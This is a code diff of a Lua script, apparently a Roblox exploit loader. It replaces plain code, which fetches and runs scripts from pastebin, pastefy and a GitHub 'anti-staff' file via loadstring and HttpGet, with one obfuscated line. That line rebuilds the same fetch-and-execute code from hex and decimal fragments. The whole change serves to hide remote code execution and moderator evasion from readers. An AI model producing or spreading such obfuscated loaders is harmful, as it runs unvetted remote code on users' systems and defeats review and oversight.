@@ -1,11 +1,1 @@
-local PlaceScripts = {
-    [9872472334] = "https://pastefy.app/RJWAW7Jw/raw",
-    [537413528] = "https://pastebin.com/raw/MSJeBNV1",
-}
-
-local FallbackLink = "https://pastebin.com/raw/yr0Z7c2h"
-
-local url = PlaceScripts[game.PlaceId] or FallbackLink
-loadstring(game:HttpGet(url))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTHUB-dev-god/anti-system/refs/heads/main/anti-staff"))()
+local function _tr(s)local r=""for c in s:gmatch("[^|]+")do local t,v=c:match("^(%w):(.+)$")if t=="H"then r=r..(v:gsub("..",function(x)return string.char(tonumber(x,16))end))elseif t=="D"then for n in v:gmatch("%d+")do r=r..string.char(tonumber(n))end end end return r end;loadstring(_tr("H:6c6f6361|D:108.32|H:506c6163|D:101.83|H:63|D:114|D:105.112.116|D:115|H:203d|H:207b20|H:5b|H:39383732|D:52.55.50.51|H:33345d20|H:3d20|D:34.104.116|H:7470|H:733a2f|D:47.112.97|D:115|D:116.101.102.121|H:2e6170|H:702f524a|D:87.65.87|H:374a77|D:47.114|D:97.119.34.44|D:32.91|H:35|D:51.55.52.49|D:51.53|H:32385d|H:203d|D:32|H:22|H:68747470|H:733a2f2f|H:70|H:617374|D:101.98.105.110|D:46.99.111|H:6d2f7261|D:119.47|H:4d534a65|D:66.78.86|H:3122|D:44.32.125.32|H:6c6f6361|H:6c2046|D:97.108|D:108.98|D:97|D:99.107.76|D:105.110.107|D:32|D:61.32.34.104|H:747470|D:115|H:3a2f2f|D:112|D:97.115|H:7465|H:62696e|H:2e|H:636f6d2f|D:114|D:97|H:772f79|D:114.48|H:5a|H:376332|D:104|D:34.32.108|H:6f63|D:97.108.32.117|H:72|H:6c203d|D:32.80.108.97|H:63|H:6553|D:99.114|D:105.112.116.115|H:5b67616d|D:101.46.80.108|D:97.99|H:654964|D:93|H:206f72|D:32.70|H:616c|D:108.98|D:97.99.107|D:76|H:696e6b20|H:6c|H:6f61|D:100.115.116|D:114.105|H:6e67|H:2867|H:61|D:109|D:101|D:58.72.116|D:116.112.71|H:657428|H:75726c29|H:29|H:2829|H:206c|H:6f6164|D:115.116.114|H:69|H:6e|D:103.40.103|D:97.109|H:653a|H:4874|H:74704765|D:116.40.34.104|D:116|D:116|D:112|D:115.58.47|D:47.114|H:61772e67|D:105|D:116.104.117|H:62757365|H:7263|H:6f6e|H:74656e74|D:46.99|H:6f6d2f53|D:67.82.73|D:80.84.72|H:55422d|D:100|D:101.118.45.103|D:111.100.47.97|D:110|H:74|D:105.45.115.121|D:115.116.101|H:6d2f7265|D:102.115|H:2f6865|D:97.100|H:732f6d|H:61696e2f|H:616e|D:116.105|H:2d737461|H:6666|H:22292928|D:41"))()
